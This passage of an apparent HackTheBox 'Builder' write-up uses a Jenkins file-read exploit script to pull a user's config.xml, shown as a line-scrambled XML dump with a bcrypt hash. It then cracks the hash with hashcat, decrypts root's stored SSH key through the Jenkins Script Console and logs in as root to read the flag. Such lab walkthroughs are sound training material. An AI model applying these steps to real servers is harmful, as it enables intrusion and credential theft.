+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>&lt;hudson.model.UserIdMapper&gt;
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">    </span>&lt;/entry&gt;
+</span></code></pre></div>
+<p>And now <code>jennifer</code>'s xml</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>$<span class="w"> </span>python<span class="w"> </span><span class="m">51993</span>.py<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.10:8080/<span class="w"> </span>-p<span class="w"> </span>/var/jenkins_home/users/jennifer_12108429903186576833/config.xml
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">    </span>&lt;hudson.tasks.Mailer_-UserProperty<span class="w"> </span><span class="nv">plugin</span><span class="o">=</span><span class="s2">&quot;mailer@463.vedf8358e006b_&quot;</span>&gt;
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span>&lt;hudson.search.UserSearchProperty&gt;
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">      </span>&lt;roles&gt;
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="w">    </span>&lt;jenkins.security.seed.UserSeedProperty&gt;
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">      </span>&lt;/tokenStore&gt;
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">    </span>&lt;/hudson.search.UserSearchProperty&gt;
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">      </span>&lt;timeZoneName&gt;&lt;/timeZoneName&gt;
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">  </span>&lt;properties&gt;
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">    </span>&lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="w">      </span>&lt;flags/&gt;
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="w">    </span>&lt;hudson.model.MyViewsProperty&gt;
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>&lt;/user&gt;
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="w">    </span>&lt;/jenkins.security.ApiTokenProperty&gt;
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="w">      </span>&lt;views&gt;
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="w">        </span>&lt;string&gt;authenticated&lt;/string&gt;
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="w">    </span>&lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty<span class="w"> </span><span class="nv">plugin</span><span class="o">=</span><span class="s2">&quot;display-url-api@2.200.vb_9327d658781&quot;</span>&gt;
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>&lt;user&gt;
+</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="w">          </span>&lt;name&gt;all&lt;/name&gt;
+</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="w">  </span>&lt;description&gt;&lt;/description&gt;
+</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="w">      </span>&lt;emailAddress&gt;jennifer@builder.htb&lt;/emailAddress&gt;
+</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a><span class="w">      </span>&lt;collapsed/&gt;
+</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="w">    </span>&lt;/jenkins.security.seed.UserSeedProperty&gt;
+</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="w">    </span>&lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
+</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a><span class="w">    </span>&lt;/hudson.model.MyViewsProperty&gt;
+</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a><span class="w">      </span>&lt;domainCredentialsMap<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;hudson.util.CopyOnWriteMap</span><span class="nv">$Hash</span><span class="s2">&quot;</span>/&gt;
+</span><span id="__span-7-27"><a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a><span class="w">          </span>&lt;filterQueue&gt;false&lt;/filterQueue&gt;
+</span><span id="__span-7-28"><a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a><span class="w">    </span>&lt;jenkins.security.ApiTokenProperty&gt;
+</span><span id="__span-7-29"><a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a><span class="w">      </span>&lt;primaryViewName&gt;&lt;/primaryViewName&gt;
+</span><span id="__span-7-30"><a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a><span class="w">      </span>&lt;/views&gt;
+</span><span id="__span-7-31"><a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a><span class="w">    </span>&lt;/hudson.model.TimeZoneProperty&gt;
+</span><span id="__span-7-32"><a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a><span class="w">    </span>&lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty<span class="w"> </span><span class="nv">plugin</span><span class="o">=</span><span class="s2">&quot;credentials@1319.v7eb_51b_3a_c97b_&quot;</span>&gt;
+</span><span id="__span-7-33"><a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a><span class="w">    </span>&lt;/hudson.model.PaneStatusProperties&gt;
+</span><span id="__span-7-34"><a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a><span class="w">    </span>&lt;/hudson.tasks.Mailer_-UserProperty&gt;
+</span><span id="__span-7-35"><a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a><span class="w">        </span>&lt;tokenList/&gt;
+</span><span id="__span-7-36"><a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a><span class="w">    </span>&lt;jenkins.console.ConsoleUrlProviderUserProperty/&gt;
+</span><span id="__span-7-37"><a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a><span class="w">        </span>&lt;/hudson.model.AllView&gt;
+</span><span id="__span-7-38"><a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a><span class="w">      </span>&lt;timestamp&gt;1707318554385&lt;/timestamp&gt;
+</span><span id="__span-7-39"><a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a><span class="w">          </span>&lt;owner<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;hudson.model.MyViewsProperty&quot;</span><span class="w"> </span><span class="nv">reference</span><span class="o">=</span><span class="s2">&quot;../../..&quot;</span>/&gt;
+</span><span id="__span-7-40"><a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a><span class="w">  </span>&lt;/properties&gt;
+</span><span id="__span-7-41"><a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a><span class="w">    </span>&lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
+</span><span id="__span-7-42"><a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a><span class="w">    </span>&lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
+</span><span id="__span-7-43"><a id="__codelineno-7-43" name="__codelineno-7-43" href="#__codelineno-7-43"></a><span class="w">    </span>&lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
+</span><span id="__span-7-44"><a id="__codelineno-7-44" name="__codelineno-7-44" href="#__codelineno-7-44"></a><span class="w">      </span>&lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
+</span><span id="__span-7-45"><a id="__codelineno-7-45" name="__codelineno-7-45" href="#__codelineno-7-45"></a><span class="w">          </span>&lt;properties<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;hudson.model.View</span><span class="nv">$PropertyList</span><span class="s2">&quot;</span>/&gt;
+</span><span id="__span-7-46"><a id="__codelineno-7-46" name="__codelineno-7-46" href="#__codelineno-7-46"></a><span class="w">    </span>&lt;hudson.model.TimeZoneProperty&gt;
+</span><span id="__span-7-47"><a id="__codelineno-7-47" name="__codelineno-7-47" href="#__codelineno-7-47"></a><span class="w">        </span>&lt;hudson.model.AllView&gt;
+</span><span id="__span-7-48"><a id="__codelineno-7-48" name="__codelineno-7-48" href="#__codelineno-7-48"></a><span class="w">    </span>&lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
+</span><span id="__span-7-49"><a id="__codelineno-7-49" name="__codelineno-7-49" href="#__codelineno-7-49"></a><span class="w">      </span>&lt;providerId&gt;default&lt;/providerId&gt;
+</span><span id="__span-7-50"><a id="__codelineno-7-50" name="__codelineno-7-50" href="#__codelineno-7-50"></a><span class="w">      </span>&lt;/roles&gt;
+</span><span id="__span-7-51"><a id="__codelineno-7-51" name="__codelineno-7-51" href="#__codelineno-7-51"></a><span class="w">    </span>&lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
+</span><span id="__span-7-52"><a id="__codelineno-7-52" name="__codelineno-7-52" href="#__codelineno-7-52"></a><span class="w">    </span>&lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;
+</span><span id="__span-7-53"><a id="__codelineno-7-53" name="__codelineno-7-53" href="#__codelineno-7-53"></a><span class="w">    </span>&lt;hudson.model.PaneStatusProperties&gt;
+</span><span id="__span-7-54"><a id="__codelineno-7-54" name="__codelineno-7-54" href="#__codelineno-7-54"></a>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.1&#39;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;UTF-8&#39;</span>?&gt;
+</span><span id="__span-7-55"><a id="__codelineno-7-55" name="__codelineno-7-55" href="#__codelineno-7-55"></a><span class="w">  </span>&lt;fullName&gt;jennifer&lt;/fullName&gt;
+</span><span id="__span-7-56"><a id="__codelineno-7-56" name="__codelineno-7-56" href="#__codelineno-7-56"></a><span class="w">      </span>&lt;seed&gt;6841d11dc1de101d&lt;/seed&gt;
+</span><span id="__span-7-57"><a id="__codelineno-7-57" name="__codelineno-7-57" href="#__codelineno-7-57"></a><span class="w">  </span>&lt;id&gt;jennifer&lt;/id&gt;
+</span><span id="__span-7-58"><a id="__codelineno-7-58" name="__codelineno-7-58" href="#__codelineno-7-58"></a><span class="w">  </span>&lt;version&gt;10&lt;/version&gt;
+</span><span id="__span-7-59"><a id="__codelineno-7-59" name="__codelineno-7-59" href="#__codelineno-7-59"></a><span class="w">      </span>&lt;tokenStore&gt;
+</span><span id="__span-7-60"><a id="__codelineno-7-60" name="__codelineno-7-60" href="#__codelineno-7-60"></a><span class="w">          </span>&lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
+</span><span id="__span-7-61"><a id="__codelineno-7-61" name="__codelineno-7-61" href="#__codelineno-7-61"></a><span class="w">    </span>&lt;io.jenkins.plugins.thememanager.ThemeUserProperty<span class="w"> </span><span class="nv">plugin</span><span class="o">=</span><span class="s2">&quot;theme-manager@215.vc1ff18d67920&quot;</span>/&gt;
+</span><span id="__span-7-62"><a id="__codelineno-7-62" name="__codelineno-7-62" href="#__codelineno-7-62"></a><span class="w">      </span>&lt;passwordHash&gt;#jbcrypt:<span class="nv">$2</span>a<span class="nv">$10$UwR7BpEH</span>.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;
+</span></code></pre></div>
+<p>Crack the password with <code>hashcat</code> using module <code>3200</code>:</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>$<span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">3200</span><span class="w"> </span><span class="nb">hash</span><span class="w"> </span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz<span class="w"> </span>--force
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>...
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nv">$2</span>a<span class="nv">$10$UwR7BpEH</span>.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
+</span></code></pre></div>
+<p>We retrieve <code>jennifer:princess</code>, enter the username and password in Jenkins.</p>
+<p>Inside <code>Management &gt; Credentials</code>, we notice that there is a <code>root</code> user with an SSH key.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250515211615.png" /></p>
+<p>Click on update and see the concealed credentials.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250515214120.png" /></p>
+<p>Using Firefox's developer console, get the value.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250515214153.png" /></p>
+<p>Go to Script Console.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250515211746.png" /></p>
+<p>Using <code>hudson.util.Secret.decrypt</code>, get the SSH key.</p>
+<p><img alt="" src="../HackTheBox/assets/Pasted%20image%2020250515214245.png" /></p>
+<p>Put the key into an <code>id_rsa</code> file, set permissions to <code>600</code>, and enter the system as <code>root</code>.</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>$<span class="w"> </span>ssh<span class="w"> </span>root@10.10.11.10<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Welcome<span class="w"> </span>to<span class="w"> </span>Ubuntu<span class="w"> </span><span class="m">22</span>.04.3<span class="w"> </span>LTS<span class="w"> </span><span class="o">(</span>GNU/Linux<span class="w"> </span><span class="m">5</span>.15.0-94-generic<span class="w"> </span>x86_64<span class="o">)</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w"> </span>*<span class="w"> </span>Documentation:<span class="w">  </span>https://help.ubuntu.com
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w"> </span>*<span class="w"> </span>Management:<span class="w">     </span>https://landscape.canonical.com
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w"> </span>*<span class="w"> </span>Support:<span class="w">        </span>https://ubuntu.com/pro
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">  </span>System<span class="w"> </span>information<span class="w"> </span>as<span class="w"> </span>of<span class="w"> </span>Thu<span class="w"> </span>May<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">06</span>:28:40<span class="w"> </span>PM<span class="w"> </span>UTC<span class="w"> </span><span class="m">2025</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="w">  </span>System<span class="w"> </span>load:<span class="w">              </span><span class="m">0</span>.0
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="w">  </span>Usage<span class="w"> </span>of<span class="w"> </span>/:<span class="w">               </span><span class="m">67</span>.2%<span class="w"> </span>of<span class="w"> </span><span class="m">5</span>.81GB
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w">  </span>Memory<span class="w"> </span>usage:<span class="w">             </span><span class="m">41</span>%
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w">  </span>Swap<span class="w"> </span>usage:<span class="w">               </span><span class="m">0</span>%
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">  </span>Processes:<span class="w">                </span><span class="m">220</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="w">  </span>Users<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span>:<span class="w">          </span><span class="m">0</span>
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="w">  </span>IPv4<span class="w"> </span>address<span class="w"> </span><span class="k">for</span><span class="w"> </span>docker0:<span class="w"> </span><span class="m">172</span>.17.0.1
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="w">  </span>IPv4<span class="w"> </span>address<span class="w"> </span><span class="k">for</span><span class="w"> </span>eth0:<span class="w">    </span><span class="m">10</span>.10.11.10
+</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="w">  </span>IPv6<span class="w"> </span>address<span class="w"> </span><span class="k">for</span><span class="w"> </span>eth0:<span class="w">    </span>dead:beef::250:56ff:fe94:ffd8
+</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>
+</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>
+</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>Expanded<span class="w"> </span>Security<span class="w"> </span>Maintenance<span class="w"> </span><span class="k">for</span><span class="w"> </span>Applications<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>enabled.
+</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>
+</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a><span class="m">0</span><span class="w"> </span>updates<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>applied<span class="w"> </span>immediately.
+</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>
+</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>Enable<span class="w"> </span>ESM<span class="w"> </span>Apps<span class="w"> </span>to<span class="w"> </span>receive<span class="w"> </span>additional<span class="w"> </span>future<span class="w"> </span>security<span class="w"> </span>updates.
+</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>See<span class="w"> </span>https://ubuntu.com/esm<span class="w"> </span>or<span class="w"> </span>run:<span class="w"> </span>sudo<span class="w"> </span>pro<span class="w"> </span>status
+</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>
+</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>
+</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>The<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>available<span class="w"> </span>updates<span class="w"> </span>is<span class="w"> </span>more<span class="w"> </span>than<span class="w"> </span>a<span class="w"> </span>week<span class="w"> </span>old.
+</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>To<span class="w"> </span>check<span class="w"> </span><span class="k">for</span><span class="w"> </span>new<span class="w"> </span>updates<span class="w"> </span>run:<span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>update
+</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>
+</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>Last<span class="w"> </span>login:<span class="w"> </span>Mon<span class="w"> </span>Feb<span class="w"> </span><span class="m">12</span><span class="w"> </span><span class="m">13</span>:15:44<span class="w"> </span><span class="m">2024</span><span class="w"> </span>from<span class="w"> </span><span class="m">10</span>.10.14.40
+</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>root@builder:~#<span class="w"> </span>whoami
+</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a>root
+</span></code></pre></div>
+<h2 id="post-exploitation">Post Exploitation</h2>
+<p>Get the flag</p>
+<div class="language-shell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>root@builder:~#<span class="w"> </span>cat<span class="w"> </span>root.txt
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>73f92cd64712c975042efbe9d114d6ac
+</span></code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "..", "features": ["content.code.copy", "content.code.select", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.section", "navigation.top", "navigation.expand", "search.share", "search.suggest", "navigation.indexes"], "search": "../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
